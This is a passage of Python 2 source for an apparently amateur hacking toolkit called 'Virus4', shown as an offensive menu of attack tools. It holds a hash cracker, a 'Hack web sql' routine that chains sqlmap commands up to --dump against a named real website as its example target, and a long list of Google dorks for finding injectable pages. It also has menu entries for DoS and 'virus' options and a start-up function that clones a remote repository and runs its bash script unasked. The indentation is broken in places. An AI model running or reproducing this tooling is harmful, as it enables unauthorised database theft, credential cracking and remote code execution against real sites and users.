		           		print (B+"\n["+W+"="+B+"]"+G+" password found ")
				        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('hervorheb2>')[1][:-18]+"\n")
					sys.exit()

				else:

					end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
					print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(date)
					hash = "sha1"
			except IOError:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
				print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)
				hash = "sha1"

		elif cek == "2" or cek == "02" or cek == "ripemd160":
			hash = 'ripemd160'
		else:
			print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)
#			time.sleep(0.5)
			sys.exit()

	elif len(hash_str)==len(sha224) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA224")
		hash = "SHA224"

	elif len(hash_str)==len(sha384) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA384")
		hash = "SHA384"

	elif len(hash_str)==len(sha256) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"sha256")
#		time.sleep(0.5)
		print (B+"["+R+"="+B+"] "+G+"open google")
#		time.sleep(0.3)
		print (B+"["+W+"*"+B+"] "+G+"Start ...")
#		time.sleep(0.3)
		start = ("00:00:00")
		start1 = time.time()
		print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)

		try:
			data = urlencode({"hash":hash_str, "decrypt":"Decrypt"})
	     	        html = urlopen("http://md5decrypt.net/en/Sha256/", data)
	        	find = html.read()
    		        match = search (r'<b>[^<]*</b><br/><br/>', find)
		        if match:

        			end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
			        print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)
#				time.sleep(0.3)
	           		print (B+"\n["+W+"="+B+"]"+G+" password found ")
			        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('<b>')[1][:-14]+"\n")
				sys.exit()

			else:

			        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
				print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)
				hash = "sha256"
		except IOError:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
				print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)
				hash = "sha256"

	else:
		print (R+"["+W+"!"+R+"] "+G+"Hash error\n"+W)
		sys.exit()

	time.sleep(0.1)
	print (B+"["+W+"="+B+"] "+G+"cek wordlist ..")

	try:
		w = open("wordlist.txt","r").readlines()
		x = len(w)
	except IOError:
#		time.sleep(0.5)
		print (B+"["+R+"="+B+"]"+G+" Can't load "+W+"wordlist.txt, "+G+"file not exist\n"+W)
		sys.exit()

#	time.sleep(0.3)
	print (B+"["+R+"="+B+"] "+G+"load "+W+"{}"+G+" words in "+W+"wordlist.txt").format(x)
	print (B+"["+W+"*"+B+"] "+G+"start ..\n")
#	time.sleep(1)

	start = ("00:00:00")
	start1 = time.time()
	print (B+"["+W+"{}"+B+"] "+G+"Cracking..."+Y).format(start)

	pbar = progressbar.ProgressBar()

	if hash == "mysql1323":

		hash_str = hash_str.lower()
		for line in pbar(w):
			line = line.strip()
			h = m20.encrypt(line)


			if h == hash_str:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
				print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
		sys.exit()

	elif hash == "lmhash":

		hasb_str = hash_str.upper()
		for line in pbar(w):
			line = line.strip()
			h = lmhash.encrypt(line)
			if h == hash_str:

			        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
                sys.exit()

	elif hash == "nthash":

		hasb_str = hash_str.upper()
                for line in pbar(w):
                        line = line.strip()
                        h = nthash.encrypt(line)

                        if h == hash_str:

			        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
                print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
                sys.exit()

	elif hash == "mysql41":

		hash_str = hash_str.upper()
		for line in pbar(w):
			line = line.strip()
			h = m25.encrypt(line)

			if h == hash_str:

			        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
                sys.exit()

	elif hash == "mssql2000":

		hash_str = hash_str.upper()
		for line in pbar(w):
			line = line.strip()
			h = ms20.encrypt(line)

			if h == hash_str:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
                sys.exit()

	elif hash == "ntlm":

		hash_str = hash_str.lower()
		for line in pbar(w):
			line = line.strip()
			h = ntlm_hash = binascii.hexlify(hashlib.new('md4', line.encode('utf-16le')).digest())
			if h == hash_str:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#				time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
                sys.exit()

	elif hash == "mssql2005":

		hasb_str = hash_str.upper()
                for line in pbar(w):
                        line = line.strip()
                        h = ms25.encrypt(line)

                        if h == hash_str:

                                end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#                                time.sleep(0.3)
                                print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#                                time.sleep(0.3)
                                print (B+"["+W+"="+B+"]"+G+" password found ")
                                print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
                                sys.exit()


		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
                print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
		sys.exit()

	else:

		hash_str = hash_str.lower()
		for line in pbar(w):

			line = line.strip()
		        h = hashlib.new(hash)
			h.update(line)

			if h.hexdigest() == hash_str:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
#				time.sleep(0.3)
				print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)
#				time.sleep(0.3)
				print (B+"["+W+"="+B+"]"+G+" password found ")
        	       		print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")
				sys.exit()

		end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
		print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)
		sys.exit()

 try:
	if sys.argv[1] == "-u":
		Update()
	elif sys.argv[1] == "-i" or sys.argv[1] == "--info":
		info()
	else:
		print (R+"["+W+"!"+R+"] "+G+"Command Error !!"+W)
		sys.exit()

 except IndexError:
	hash()

 " Thanks you ^^"
 backtomenu_website()
def termux_sql():
  def url():
      print red +"                                          [0]back"
      time.sleep(0.05)
      print ""
      time.sleep(0.05)
      print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
      time.sleep(0.05)
      print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'
      time.sleep(0.05)
      print cyan+'[+]-------------------------------------------------------------[+]'
      time.sleep(0.05)
      url = raw_input(red +'   URL-------> ')
      a = str(url)
      if a == '0' or a == '00' :
        sql()
      else :
       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' --dbs s-- level=3 --risk=3 --batch')
       def dataase():
        print red +"                                          [0]back"
        time.sleep(0.05)
        print ""
        time.sleep(0.05)
        print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
        time.sleep(0.05)
        print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'
        time.sleep(0.05)
        print cyan+'[+]-------------------------------------------------------------[+]'
        data = raw_input(red +'   DATABASE-------> ')
        x = str(data)
        if x == '0' or x == '00' :
          url()
        else :
         os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')
         def table():
          print red +"                                          [0]back"
          time.sleep(0.05)
          print ""
          time.sleep(0.05)
          print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
          time.sleep(0.05)
          print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'
          time.sleep(0.05)
          print cyan+'[+]-------------------------------------------------------------[+]'
          time.sleep(0.05)
          table = raw_input(red +'   TABLE-------> ')
          d = str(table)
          if d == '0' or d == '00' :
             dataase()
          else :
           os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')
           def column():
              print red +"                                          [0]back"
              time.sleep(0.05)
              print ""
              time.sleep(0.05)
              print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
              time.sleep(0.05)
              print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'
              time.sleep(0.05)
              print cyan+'[+]-------------------------------------------------------------[+]'
              time.sleep(0.05)
              columns = raw_input(red +'   COLUMN-------> ')
              c = str(columns)
              if c == '0' or c == '00' :
                   table()
              else :
                os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')
           column() 
         table()
       dataase()
  url()
  backtomenu_website()                    
def kali_sql():
  def url():
      print red +"                                          [0]back"
      time.sleep(0.05)
      print ""
      time.sleep(0.05)
      print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
      time.sleep(0.05)
      print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'
      time.sleep(0.05)
      print cyan+'[+]-------------------------------------------------------------[+]'
      time.sleep(0.05)
      url = raw_input(red +'   URL-------> ')
      a = str(url)
      if a == '0' or a == '00' :
        sql()
      else :
       os.system('sqlmap -u '+url+' --dbs s-- level=3 --risk=3 --batch')
       def dataase():
        print red +"                                          [0]back"
        time.sleep(0.05)
        print ""
        time.sleep(0.05)
        print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
        time.sleep(0.05)
        print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'
        time.sleep(0.05)
        print cyan+'[+]-------------------------------------------------------------[+]'
        data = raw_input(red +'   DATABASE-------> ')
        x = str(data)
        if x == '0' or x == '00' :
          url()
        else :
         os.system('sqlmap -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')
         def table():
          print red +"                                          [0]back"
          time.sleep(0.05)
          print ""
          time.sleep(0.05)
          print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
          time.sleep(0.05)
          print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'
          time.sleep(0.05)
          print cyan+'[+]-------------------------------------------------------------[+]'
          time.sleep(0.05)
          table = raw_input(red +'   TABLE-------> ')
          d = str(table)
          if d == '0' or d == '00' :
             dataase()
          else :
           os.system('sqlmap.py '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')
           def column():
              print red +"                                          [0]back"
              time.sleep(0.05)
              print ""
              time.sleep(0.05)
              print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'
              time.sleep(0.05)
              print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'
              time.sleep(0.05)
              print cyan+'[+]-------------------------------------------------------------[+]'
              time.sleep(0.05)
              columns = raw_input(red +'   COLUMN-------> ')
              c = str(columns)
              if c == '0' or c == '00' :
                   table()
              else :
                os.system('sqlmap -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')
           column() 
         table()
       dataase()
  url()   
  backtomenu_website()                                               
def sql():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Hack web sql in Termux'
 time.sleep(0.05)
 print cyan +'        [02]Hack web sql in Kali linux'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "website/hack_web_sql"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      termux_sql()
 elif nember == '2' or nember == '02' :
      kali_sql()
 elif nember == '0' or nember == '00' :
      website()
 else :
      error()
      sql()
def dork():
 print cyan+"""
inurl:trainers.php?id= 
inurl:buy.php?category= 
inurl:article.php?ID= 
inurllay_old.php?id= 
inurl:declaration_more.php?decl_id= 
inurlageid= 
ld.php?id= 
inurl:declaration_more.php?decl_id= 
inurlageid= 
inurl:games.php?id= 
inurlage.php?file= 
inurl:newsDetail.php?id= 
inurl:gallery.php?id= 
inurl:article.php?id= 
inurl:show.php?id= 
inurl:staff_id= 
inurl:newsitem.php?num= 
inurl:readnews.php?id= 
inurl:top10.php?cat= 
inurl:historialeer.php?num= 
inurl:reagir.php?num= 
inurl:Stray-Questions-View.php?num= 
inurl:forum_bds.php?num= 
inurl:game.php?id= 
inurl:index.php?id= 
inurl:trainers.php?id= 
inurl:buy.php?category= 
inurl:article.php?ID= 
inurllay_oinurl:view_product.php?id= 
inurl:newsone.php?id= 
inurl:sw_comment.php?id= 
inurl:news.php?id= 
inurl:avd_start.php?avd= 
inurl:event.php?id= 
inurlroduct-item.php?id= 
inurl:sql.php?id= 
inurl:news_view.php?id= 
inurl:select_biblio.php?id= 
inurl:humor.php?id= 
inurl:aboutbook.php?id= 
inurlgl_inet.php?ogl_id= 
inurl:fiche_spectacle.php?id= 
inurl:communique_detail.php?id= 
inurl:sem.php3?id= 
inurl:kategorie.php4?id= 
inurl:news.php?id= 
inurl:index.php?id= 
inurl:faq2.php?id= 
inurl:show_an.php?id= 
inurl:review.php?id= 
inurl:loadpsb.php?id= 
inurlinions.php?id= 
inurl:spr.php?id= 
inurlages.php?id= 
inurl:announce.php?id= 
inurl:clanek.php4?id= 
inurlarticipant.php?id= 
inurl:download.php?id= 
inurl:main.php?id= 
inurl:review.php?id= 
inurl:chappies.php?id= 
inurl:read.php?id= 
inurlrod_detail.php?id= 
inurl:viewphoto.php?id= 
inurl:article.php?id= 
inurlerson.php?id= 
inurlroductinfo.php?id= 
inurl:showimg.php?id= 
inurl:view.php?id= 
inurl:***site.php?id= 
inurl:hosting_info.php?id= 
inurl:gallery.php?id= 
inurl:rub.php?idr= 
inurl:view_faq.php?id= 
inurl:artikelinfo.php?id= 
inurl:detail.php?ID= 
inurl:index.php?= 
inurlrofile_view.php?id= 
inurl:category.php?id= 
inurlublications.php?id= 
inurl:fellows.php?id= 
inurl:downloads_info.php?id= 
inurlrod_info.php?id= 
inurl:shop.php?do=part&id= 
inurlroductinfo.php?id= 
inurl:collectionitem.php?id= 
inurl:band_info.php?id= 
inurlroduct.php?id= 
inurl:releases.php?id= 
inurl:ray.php?id= 
inurlroduit.php?id= 
inurlop.php?id= 
inurl:shopping.php?id= 
inurlroductdetail.php?id= 
inurlost.php?id= 
inurl:viewshowdetail.php?id= 
inurl:clubpage.php?id= 
inurl:memberInfo.php?id= 
inurl:section.php?id= 
inurl:theme.php?id= 
inurlage.php?id= 
inurl:shredder-categories.php?id= 
inurl:tradeCategory.php?id= 
inurlroduct_ranges_view.php?ID= 
inurl:shop_category.php?id= 
inurl:transcript.php?id= 
inurl:channel_id= 
inurl:item_id= 
inurl:newsid= 
inurl:trainers.php?id= 
inurl:news-full.php?id= 
inurl:news_display.php?getid= 
inurl:index2.php?option= 
inurl:readnews.php?id= 
inurl:top10.php?cat= 
inurl:newsone.php?id= 
inurl:event.php?id= 
inurlroduct-item.php?id= 
inurl:sql.php?id= 
inurl:aboutbook.php?id= 
inurlreview.php?id= 
inurl:loadpsb.php?id= 
inurlages.php?id= 
inurl:material.php?id= 
inurl:clanek.php4?id= 
inurl:announce.php?id= 
inurl:chappies.php?id= 
inurl:read.php?id= 
inurl:viewapp.php?id= 
inurl:viewphoto.php?id= 
inurl:rub.php?idr= 
inurl:galeri_info.php?l= 
inurl:review.php?id= 
inurl:iniziativa.php?in= 
inurl:curriculum.php?id= 
inurl:labels.php?id= 
inurl:story.php?id= 
inurl:look.php?ID=  inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
inurl:readnews.php?id=
inurl:top10.php?cat=
inurl:historialeer.php?num=
inurl:reagir.php?num=
inurl:Stray-Questions-View.php?num=
inurl:forum_bds.php?num=
inurl:game.php?id=
inurl:view_product.php?id=
inurl:newsone.php?id=
inurl:sw_comment.php?id=
inurl:news.php?id=
inurl:avd_start.php?avd=
inurl:event.php?id=
inurl:product-item.php?id=
inurl:sql.php?id=
inurl:news_view.php?id=
inurl:select_biblio.php?id=
inurl:humor.php?id=
inurl:aboutbook.php?id=
inurl:ogl_inet.php?ogl_id=
inurl:fiche_spectacle.php?id=
inurl:communique_detail.php?id=
inurl:sem.php3?id=
inurl:kategorie.php4?id=
inurl:news.php?id=
inurl:index.php?id=
inurl:faq2.php?id=
inurl:show_an.php?id=
inurl:preview.php?id=
inurl:loadpsb.php?id=
inurl:opinions.php?id=
inurl:spr.php?id=
inurl:pages.php?id=
inurl:announce.php?id=
inurl:clanek.php4?id=
inurl:participant.php?id=
inurl:download.php?id=
inurl:main.php?id=
inurl:review.php?id=
inurl:chappies.php?id=
inurl:read.php?id=
inurl:prod_detail.php?id=
inurl:viewphoto.php?id=
inurl:article.php?id=
inurl:person.php?id=
inurl:productinfo.php?id=
inurl:showimg.php?id=
inurl:view.php
"""
 backtomenu_website()
def website():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Dos Attack'
 time.sleep(0.05)
 print cyan +'        [02]Admin panel finder'
 time.sleep(0.05)
 print cyan +'        [03]hash id '
 time.sleep(0.05)
 print cyan +'        [04]HaCk WEB SQL'
 time.sleep(0.05)
 print cyan +'        [05]Dork Google'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "website"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      ddos()
 elif nember == '2' or nember == '02' :
      admin()
 elif nember == '3' or nember == '03' :
      hash_id()
 elif nember == '4' or nember == '04' :
      sql()
 elif nember == '5' or nember == '05' :
      dork()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      website()	 
def up_date():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 x = raw_input(cyan +'enter in update >')
 if x == "0" or x == '00':
   Virus4()
 else :
  os.system('rm -rf update.sh')
  f = open('update.sh' , 'w')
  f.write('''
rm -rf update.sh
rm -rf ../Virus4
cd ..
git clone https://github.com/amerlaceset/Virus4
cd Virus4
chmod +x *
echo ''
echo ' hello '
echo '       in'
echo '          last'
echo '               version'
echo ''
sleep 6
python2 Virus4.py
''')
  f.close()
  os.system('mv -v update.sh ..')
  os.system('bash ../update.sh')
def my_youtube():
 print ""
 time.sleep(2)
 print cyan+'  {'+red+'Virus4 Hacking'+cyan+'}--------{'+red+'https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg'+cyan+'}'
 time.sleep(6)
 webbrowser.open_new('https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg')
 os.system("termux-open https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg ")
 Virus4()
def my_facebook():
 print ""
 time.sleep(2)
 print cyan+'  {'+blue+'Amer Amer'+cyan+'}--------{'+blue+'https://www.facebook.com/100019536310282'+cyan+'}'
 time.sleep(6)
 webbrowser.open_new('https://www.facebook.com/100019536310282')
 os.system('termux-open https://www.facebook.com/100019536310282')
 Virus4()
def moni():
 print ''
 time.sleep(2)
 print cyan + '[*]starting the Virus4 ...'
 time.sleep(3)
 print ''
 os.system('rm -rf moni')
 os.system('git clone https://github.com/amerlaceset/moni')
 os.system('clear')
 os.system('bash moni/mona.sh')
 os.system('rm -rf moni')
def sem():
 e = str(random.randint(1,18))
 if e in "1":
   sem_2()
 elif e in "2":
   sem_3()
 elif e in "3":
   sem_4()
 elif e in "4":
   sem_5()
 elif e in "5":
   sem_6()
 elif e in "6":
   sem_7()
 elif e in "7":
   sem_8()
 elif e in "8":
   sem_9()
 elif e in "9":
   sem_10()
 elif e in "10":
   sem_11()
 elif e in "11":
   sem_12()
 elif e in "12":
   sem_13()
 elif e in "13":
   sem_14()
 elif e in "14":
   sem_15()
 elif e in "15":
   sem_16()
 elif e in "16":
   sem_17()
 elif e in "17":
   sem_18()
 elif e in "18":
   sem_19()
 else :
   print "error"

def Virus4():
 sem()
 print '                     '+blue+'V' +green+ '  i' +reset+ '  r' +purple+ '  u' +cyan+ '  s' +yellow+ '  4' +green +' ^_^'
 time.sleep( 0.05)
 time.sleep( 0.05)
 kk(h)
 print green + "  +________________________________________________________+"
 time.sleep(0.05)
 print '  |' + cyan + "  [1] metasploit  |" +  reset + "  [2]Download   |" + purple + "  [3] Account       | "
 time.sleep(0.05)
 print ""
 time.sleep(0.05)
 print  green + "  |           --------------------------------             |  "
 time.sleep(0.05)
 print '  |' + red + "  [4] virus       | " + green + " [5] ngrok     | " + blue + " [6]  nmap         |    "
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 print green + "  |           --------------------------------             |  "
 time.sleep(0.05)
 print '  |' + green + "  [7] Games       | " + reset + " [8] Termux    | " + purple + " [9] WEBsite       |    "
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 print  green + "  |           --------------------------------             |  "
 time.sleep(0.05)
 print '  |' + red + "  [00] Exit       | " + green + " [90] help     |" + blue + " [99] update        |    "
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 print  green + "  |           --------------------------------             |  "
 gg(f)
 gg(y)
 time.sleep(0.05)
 print''
 time.sleep(0.05)

 time.sleep(0.05)
#echo -e "$green"
 nem = raw_input(cyan+"  |---{" + yellow + " my ip " + cyan +"}---| " +cyan+'    ('+red+'y'+cyan+') or ('+red+'n'+cyan+') ')
 if nem == 'y' or nem == '(y)' or nem == 'Y' or nem == '(Y)' :
  os.system('curl ifconfig.me')
  print blue
  os.system('ifconfig wlan0 | grep -o 192..........')
 else :
   print cyan+'     was canceled'
 #echo -e "$green "
 time.sleep(0.05)
 print''
 time.sleep(0.05)
 enter =raw_input( cyan + " { 5.0.0 } Virus4 > ")
 if enter == "1" or enter == "metasploit" or enter == "01":
  metasploitf()
 elif enter == "2" or enter == "Download" or enter == "02":
  download()
 elif enter == "3" or enter == 'Account' or enter == "03":
  account()
 elif enter == "4" or enter == 'virus' or enter == "04":
  virus()
 elif enter == "5" or enter == 'ngrok' or enter == "05":
  Ngrok()
 elif enter == "6" or enter == 'nmap' or enter == "06":
  Nmap()
 elif enter == "7" or enter == 'Games' or enter == "07":
  games()
 elif enter == "8" or enter == 'Termux' or enter == "08":
  termux()
 elif enter == "9" or enter == 'WEBsite' or enter == "09":
  website()
 elif enter == "90" or enter == 'help':
  help()
 elif enter == "99"or enter == 'update':
  up_date()
 elif enter == "00" or enter == 'exit' or enter == "0" or enter == "quit":
  exit()
 elif enter == "20" or enter == 'youtube':
  my_youtube()
 elif enter == "30" or enter == "facebook":
  my_facebook()
 else:
  error()
  Virus4()
moni()
Virus4()
